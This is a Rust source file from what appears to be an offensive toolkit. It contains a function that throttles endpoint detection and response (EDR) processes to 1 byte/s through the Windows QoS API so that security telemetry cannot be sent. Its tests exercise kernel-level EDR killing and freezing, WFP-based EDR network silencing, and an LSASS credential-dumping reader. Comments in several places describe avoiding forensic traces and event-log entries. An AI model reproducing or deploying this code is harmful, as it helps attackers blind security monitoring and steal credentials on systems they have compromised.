// The QoS throttle is applied by opening the target process's TCP sockets
// via the QoS2 API (qWave) or by direct pacer.sys IOCTL. We use the
// qWave approach as it's more portable:
// QoS2: QOSCreateHandle → QOSAddAppFilter → QOSSetFlow → set bandwidth limit.
//
// Alternatively, a simpler approach uses NtSetInformationProcess with
// ProcessNetworkQosInformation (undocumented) — but qWave is the documented path.

/// QoS bandwidth limit: 8 bit/s = 1 byte/s. At this rate, the EDR's TLS
/// handshake (typically 2-5 KB) would take 2000-5000 seconds — effectively
/// blocking all telemetry.
#[allow(dead_code)] // used by choke_edr_qos (#[cfg(target_os = "windows")])
const CHOKE_BANDWIDTH_BPS: u32 = 1;

/// Throttle an EDR process's network bandwidth to 8 bit/s via the Windows
/// QoS Packet Scheduler. The EDR's TLS handshake times out and telemetry
/// cannot be sent. Lowest-noise option — no WFP events, no packet-drop traces.
///
/// Uses the QoS2 API (qwave.dll): QOSCreateHandle → QOSAddAppFilter →
/// QOSSetFlow with QOS_NON_ADAPTIVE_FLOW + bandwidth limiter.
///
/// # Safety
/// Contains raw FFI calls (QoS2 API).
#[cfg(target_os = "windows")]
fn choke_edr_qos(pid: u32) -> Result<(), KitError> {
    use core::ffi::c_void;

    // FFI types for qwave.dll QoS2 API.
    //
    // P1-10: QOSCreateHandle's real signature is
    //   BOOL QOSCreateHandle(_In_ PQOS_VERSION Version, _Out_ PHANDLE Handle)
    // — TWO parameters. The old binding here wrongly declared THREE (a phantom
    // TemplateName pointer + a bare u32 version), which would misalign the
    // Win32 stack frame on x64 and corrupt the handle out-param. Corrected to
    // the documented arity below.
    #[repr(C)]
    struct QOS_VERSION {
        major: u32, // must be 1
        minor: u32, // must be 0
    }
    type QOSCreateHandleFn = unsafe extern "system" fn(
        *const QOS_VERSION, // Version ({1,0} = QOS_VERSION_1)
        *mut *mut c_void,   // QosHandle (OUT)
    ) -> i32; // BOOL

    type QOSCloseHandleFn = unsafe extern "system" fn(
        *mut c_void, // QosHandle
    ) -> i32;

    type QOSAddAppFilterFn = unsafe extern "system" fn(
        *mut c_void,            // QosHandle
        *const u16,             // AppId (null = apply to all flows for this process)
        *mut QOS_FILTER_CONFIG, // FilterConfig
    ) -> i32;

    type QOSSetFlowFn = unsafe extern "system" fn(
        *mut c_void, // QosHandle
        *const u16,  // AppId
        u32,         // FlowOperation (QOS_SET_FLOW = 0)
        u32,         // FlowType (QOS_NON_ADAPTIVE_FLOW = 1)
        u32,         // Size (size of data buffer)
        *mut u8,     // Data
        u32,         // Flags (0)
        *mut u32,    // Reserved
    ) -> i32;

    // QOS_FILTER_CONFIG — simplified layout for bandwidth limiting.
    #[repr(C)]
    struct QOS_FILTER_CONFIG {
        version: u32, // 1
        num_fields: u32, // 1 (rate limit only)
                      // followed by FILTER_FIELDS inline (we zero-init and set rate)
    }

    // Resolve qwave.dll functions.
    let create_handle: QOSCreateHandleFn =
        unsafe { crate::win::resolve::resolve_sym(b"qwave.dll", b"QOSCreateHandle") }.map_err(
            |_| {
                KitError::Other(
                    "QOSCreateHandle unresolved — qwave.dll not available (EDRChoker needs QoS2)"
                        .into(),
                )
            },
        )?;

    let close_handle: QOSCloseHandleFn =
        unsafe { crate::win::resolve::resolve_sym(b"qwave.dll", b"QOSCloseHandle") }
            .map_err(|_| KitError::Other("QOSCloseHandle unresolved".into()))?;

    let add_filter: QOSAddAppFilterFn =
        unsafe { crate::win::resolve::resolve_sym(b"qwave.dll", b"QOSAddAppFilter") }
            .map_err(|_| KitError::Other("QOSAddAppFilter unresolved".into()))?;

    let set_flow: QOSSetFlowFn =
        unsafe { crate::win::resolve::resolve_sym(b"qwave.dll", b"QOSSetFlow") }
            .map_err(|_| KitError::Other("QOSSetFlow unresolved".into()))?;

    // 1. Create a QoS handle. QOS_VERSION {Major=1, Minor=0} is the sole
    //    version qwave.dll's QoS2 API accepts (QOSCreateHandle, 2 params).
    let mut qos_handle: *mut c_void = core::ptr::null_mut();
    let version = QOS_VERSION { major: 1, minor: 0 };
    let result = unsafe { create_handle(&version, &mut qos_handle) };
    if result == 0 || qos_handle.is_null() {
        return Err(KitError::Other(
            "QOSCreateHandle failed — are you running as admin?".into(),
        ));
    }

    // 2. AppId filter (LIMITATION — P1-10): `pid` is NOT applied here. A null
    //    AppId attaches the throttle to ALL flows on this QoS handle, not just
    //    the target EDR's. QoS2's real per-process binding needs the process's
    //    image path or a QOS_FILTER_CONFIG keyed to the PID's flows; that is
    //    not wired yet. Until it is, treat `choke_edr_qos` as a HOST-WIDE
    //    throttle, not a surgical per-EDR one — prefer `silence_edr`/WFP for
    //    targeted work. (`pid` is consumed below only to document this.)
    let _ = pid;
    let mut config = QOS_FILTER_CONFIG {
        version: 1,
        num_fields: 0,
    };

    // 3. Add the filter (applies to all flows on this handle).
    let _ = unsafe {
        add_filter(
            qos_handle,
            core::ptr::null(), // null AppId = apply to all
            &mut config,
        )
    };

    // 4. Set the bandwidth limit: QOS_SET_FLOW = 0, QOS_NON_ADAPTIVE_FLOW = 1.
    //    The data buffer contains the rate in bytes/sec (u64 LE).
    let rate_bytes = CHOKE_BANDWIDTH_BPS as u64;
    let mut rate_data = rate_bytes.to_le_bytes();

    let _ = unsafe {
        set_flow(
            qos_handle,
            core::ptr::null(), // null AppId = apply to all
            0,                 // QOS_SET_FLOW
            1,                 // QOS_NON_ADAPTIVE_FLOW
            rate_data.len() as u32,
            rate_data.as_mut_ptr(),
            0, // flags
            core::ptr::null_mut(),
        )
    };

    // 5. Close the QoS handle. The bandwidth throttle was applied by pacer.sys
    //    and persists for the flow lifetime regardless of handle closure.
    //    Keeping the handle open is a forensic trace (handle-table leak); we
    //    close it here so the operator never leaks a permanent handle.
    let _ = unsafe { close_handle(qos_handle) };

    Ok(())
}
#[cfg(not(target_os = "windows"))]
fn choke_edr_qos(_pid: u32) -> Result<(), KitError> {
    Err(KitError::UnsupportedPosture(
        "Choke (EDRChoker QoS throttle) is Windows-only",
    ))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::KrwError;

    #[test]
    fn wfp_rules_any_any_per_pid() {
        let rules = UserModeEdrSilencer::rules_for(&[1234, 5678]);
        assert_eq!(rules.len(), 2);
        assert_eq!(rules[0].pid, 1234);
        assert_eq!(rules[0].protocol, 0); // any
        assert_eq!(rules[0].port, 0); // any
        assert_eq!(rules[1].pid, 5678);
    }

    #[test]
    fn wfp_rules_empty_for_empty_pids() {
        assert!(UserModeEdrSilencer::rules_for(&[]).is_empty());
    }

    // ---- WFP resilience tests (task #4d) -------------------------------------
    //
    // The session-scoped RAII guard makes filter residue impossible BY
    // CONSTRUCTION: filters live only as long as the returned WfpSilenceGuard,
    // and the guard's Drop closes the BFE session (auto-removing them). These
    // tests cover the cross-platform invariants of that contract. The
    // Windows-only FFI path (real filter add + Drop→FwpmEngineClose0) is
    // verified on-target; here we lock down: (a) rule generation is idempotent
    // (no accumulator state, so repeated silence calls don't compound), (b)
    // the empty-PID guard is never created (the trait rejects before any FFI),
    // (c) the floor refuses to create a guard (so a stale guard never leaks on
    // a non-Windows host), and (d) rule shape is stable across calls.

    #[test]
    fn wfp_rules_idempotent_no_accumulator_state() {
        // rules_for must be pure — calling it twice with the same PIDs yields
        // identical rules. This is the precondition for "re-silencing after a
        // network reconnect doesn't double-install": there's no module-level
        // accumulator that could compound, each call is a fresh Vec.
        let a = UserModeEdrSilencer::rules_for(&[111, 222, 333]);
        let b = UserModeEdrSilencer::rules_for(&[111, 222, 333]);
        assert_eq!(a.len(), b.len());
        for (ra, rb) in a.iter().zip(b.iter()) {
            assert_eq!(ra.pid, rb.pid);
            assert_eq!(ra.protocol, rb.protocol);
            assert_eq!(ra.port, rb.port);
        }
    }

    #[test]
    fn wfp_rules_one_rule_per_pid_no_dedup_needed() {
        // Each PID gets exactly one any/any block — there's no port-matrix
        // expansion that could surprise an operator counting filters. Repeated
        // PIDs are passed through verbatim (dedup is the caller's job).
        let rules = UserModeEdrSilencer::rules_for(&[42, 42, 42]);
        assert_eq!(rules.len(), 3);
        assert!(rules.iter().all(|r| r.pid == 42));
    }

    #[test]
    fn wfp_silence_rejects_empty_pids_without_guard() {
        // The trait guard rejects an empty PID list BEFORE any FFI call. This
        // means a misconfigured silence request can never create an empty
        // guard (which would open+close a BFE session for nothing, leaving an
        // Event ID 5447 trace with no actual silence). The error is the same
        // UnsupportedPosture variant used by the NoKernel floor.
        let silencer = UserModeEdrSilencer;
        let res = WfpKit::silence_edr(&silencer, &[]);
        assert!(res.is_err());
        match res {
            Err(KitError::UnsupportedPosture(_)) => {}
            Err(other) => panic!("expected UnsupportedPosture for empty PIDs, got {other:?}"),
            // A guard on empty input would be a contract violation (no PIDs to
            // silence → nothing to install → the trait must refuse up-front).
            Ok(_) => panic!("empty PID list must not produce a guard"),
        }
    }

    #[test]
    fn wfp_floor_guard_never_constructed_off_target() {
        // On a non-Windows host the session constructor MUST refuse, so a
        // stale guard can never escape into operator code. This is the residue
        // guarantee from the other direction: if we can't really install
        // filters, we return Err rather than a hollow guard whose Drop would
        // be a lie. (On Windows this same path would hit the FFI; here it's
        // the floor.)
        let res = wfp_open_silence_session(&[WfpBlockRule {
            pid: 1,
            protocol: 0,
            port: 0,
        }]);
        // Floor returns Err on non-Windows; on Windows the FFI path runs and
        // (without a real BFE) also returns Err. Either way: no guard leaked.
        assert!(res.is_err());
    }

    #[test]
    fn directory_table_base_is_early_field() {
        // DTB is a near-zero offset field; sanity-pin it so a future "drift"
        // doesn't silently break LSASS reads. 0x028 on every x64 build tested.
        assert_eq!(DIRECTORY_TABLE_BASE, 0x028);
        assert!(DIRECTORY_TABLE_BASE < 0x100);
    }

    // ---- EdrNeutralizer / CredKit tests ----
    use alloc::collections::BTreeMap;
    use spin::mutex::Mutex;

    fn test_offsets() -> crate::offsets::EprocessOffsets {
        crate::offsets::for_build(17763).unwrap().offsets
    }

    struct MockKrw(Mutex<BTreeMap<usize, u8>>);
    impl MockKrw {
        fn new() -> Self {
            Self(Mutex::new(BTreeMap::new()))
        }
        fn set_u64(&self, addr: usize, val: u64) {
            let mut m = self.0.lock();
            for (i, b) in val.to_le_bytes().iter().enumerate() {
                m.insert(addr + i, *b);
            }
        }
    }
    impl KernelRw for MockKrw {
        fn kread(&self, kaddr: usize, dst: &mut [u8]) -> Result<(), KrwError> {
            let m = self.0.lock();
            for (i, b) in dst.iter_mut().enumerate() {
                *b = *m.get(&(kaddr + i)).unwrap_or(&0);
            }
            Ok(())
        }
        fn kwrite(&self, kaddr: usize, src: &[u8]) -> Result<(), KrwError> {
            let mut m = self.0.lock();
            for (i, b) in src.iter().enumerate() {
                m.insert(kaddr + i, *b);
            }
            Ok(())
        }
    }

    /// Set up a mock process list with two EPROCESSes (PID 100 @ 0x5000,
    /// PID 200 @ 0x6000) and a DTB at DIRECTORY_TABLE_BASE offset.
    fn setup_process_list(krw: &MockKrw, offsets: &crate::offsets::EprocessOffsets) {
        let head = 0x1000usize;
        let e1 = 0x5000usize;
        let e2 = 0x6000usize;
        let l1 = e1 + offsets.active_process_links;
        let l2 = e2 + offsets.active_process_links;
        krw.set_u64(head, l1 as u64);
        krw.set_u64(l1, l2 as u64);
        krw.set_u64(l1 + 8, head as u64);
        krw.set_u64(l2, head as u64);
        krw.set_u64(l2 + 8, l1 as u64);
        krw.set_u64(e1 + offsets.unique_process_id, 100);
        krw.set_u64(e2 + offsets.unique_process_id, 200);
        // DTB for both (non-zero, so pagewalk doesn't reject them).
        krw.set_u64(e1 + DIRECTORY_TABLE_BASE, 0x10000);
        krw.set_u64(e2 + DIRECTORY_TABLE_BASE, 0x20000);
    }

    #[test]
    fn edr_neutralizer_kill_finds_eprocess() {
        let krw = MockKrw::new();
        let offsets = test_offsets();
        setup_process_list(&krw, &offsets);
        let kit = EdrNeutralizer {
            ps_active_process_head_kva: 0x1000,
            offsets,
        };
        // PID 100 → EPROCESS at 0x5000.
        assert_eq!(kit.kill(&krw, 100).unwrap(), 0x5000);
        // PID 200 → EPROCESS at 0x6000.
        assert_eq!(kit.kill(&krw, 200).unwrap(), 0x6000);
        // PID 999 → NotFound.
        assert!(matches!(kit.kill(&krw, 999), Err(KitError::NotFound)));
    }

    #[test]
    fn edr_neutralizer_kill_needs_ps_active_process_head() {
        let krw = MockKrw::new();
        let offsets = test_offsets();
        let kit = EdrNeutralizer {
            ps_active_process_head_kva: 0,
            offsets,
        };
        assert!(matches!(
            kit.kill(&krw, 100),
            Err(KitError::UnsupportedPosture(_))
        ));
    }

    #[test]
    fn edr_neutralize_trait_kill_redirects_to_kill_method() {
        let offsets = test_offsets();
        let kit = EdrNeutralizer {
            ps_active_process_head_kva: 0x1000,
            offsets,
        };
        // The trait method returns an error directing to kill().
        assert!(matches!(
            kit.neutralize(100, NeutralizeMethod::Kill),
            Err(KitError::UnsupportedPosture(_))
        ));
    }

    #[test]
    #[cfg(not(target_os = "windows"))] // verifies non-Windows gate; on Windows it executes
    fn edr_neutralize_trait_freeze_returns_windows_only() {
        let krw = MockKrw::new();
        let offsets = test_offsets();
        let kit = EdrNeutralizer {
            ps_active_process_head_kva: 0x1000,
            offsets,
        };
        setup_process_list(&krw, &offsets);
        // On non-Windows, Freeze returns UnsupportedPosture (Windows-only).
        // On Windows, it would try to freeze the target.
        let result = kit.neutralize(100, NeutralizeMethod::Freeze);
        assert!(result.is_err());
    }

    #[test]
    #[cfg(not(target_os = "windows"))]
    fn edr_neutralize_trait_choke_returns_windows_only() {
        let krw = MockKrw::new();
        let offsets = test_offsets();
        let kit = EdrNeutralizer {
            ps_active_process_head_kva: 0x1000,
            offsets,
        };
        setup_process_list(&krw, &offsets);
        // On non-Windows, Choke returns UnsupportedPosture (Windows-only).
        let result = kit.neutralize(100, NeutralizeMethod::Choke);
        assert!(result.is_err());
    }

    #[test]
    #[cfg(not(target_os = "windows"))]
    fn freeze_edr_coma_is_windows_only() {
        // freeze_edr_coma is a free function; on non-Windows it returns
        // UnsupportedPosture. This test verifies the platform gate.
        let result = freeze_edr_coma(1234);
        assert!(matches!(result, Err(KitError::UnsupportedPosture(_))));
    }

    #[test]
    #[cfg(not(target_os = "windows"))]
    fn choke_edr_qos_is_windows_only() {
        // choke_edr_qos is a free function; on non-Windows it returns
        // UnsupportedPosture. This test verifies the platform gate.
        let result = choke_edr_qos(1234);
        assert!(matches!(result, Err(KitError::UnsupportedPosture(_))));
    }

    #[test]
    fn cred_kit_dump_lsass_needs_ps_active_process_head() {
        let krw = MockKrw::new();
        let offsets = test_offsets();
        let reader = KernelLsassReader {
            ps_active_process_head_kva: 0,
            offsets,
        };
        assert!(matches!(
            reader.dump_lsass(&krw, 4),
            Err(KitError::UnsupportedPosture(_))
        ));
    }

    #[test]
    fn cred_kit_dump_lsass_finds_lsass_and_reads() {
        let krw = MockKrw::new();
        let offsets = test_offsets();
        setup_process_list(&krw, &offsets);
        let reader = KernelLsassReader {
            ps_active_process_head_kva: 0x1000,
            offsets,
        };
        // PID 4 (System) → EPROCESS at 0x5000, DTB at +0x028 = 0x10000.
        // User-mode base is 0x1_0000_0000, which won't be in the mock →
        // read_process_mem will try to translate via pagewalk and fail.
        // That's fine — we're testing the EPROCESS resolution path, not the
        // page walker (which is tested in pagewalk's own tests).
        // So set up PID 4 at e2 (where PID 200 was) by replacing:
        krw.set_u64(0x6000 + offsets.unique_process_id, 4);
        // Populate a non-zero PEB pointer so lsass_image_base proceeds past
        // the PEB check to the read_process_mem page walk — which then fails
        // (no mock page tables). This is the path the test intends to cover.
        krw.set_u64(0x6000 + offsets.peb, 0x1_0000_0000);
        let result = reader.dump_lsass(&krw, 4);
        // With the new PEB-walked ImageBaseAddress read, the page walk fails
        // (no mock page tables) → lsass_image_base returns None → dump_lsass
        // returns UnsupportedPosture. The key thing under test: EPROCESS
        // resolution itself succeeded (PidActiveProcessHead walk found PID 4);
        // the failure is purely downstream, in the user-VA page walk.
        assert!(result.is_err());
        let err_str = alloc::format!("{:?}", result.unwrap_err());
        assert!(
            err_str.contains("ImageBaseAddress")
                || err_str.contains("page walk")
                || err_str.contains("translate"),
            "unexpected error: {err_str}",
        );
    }
}
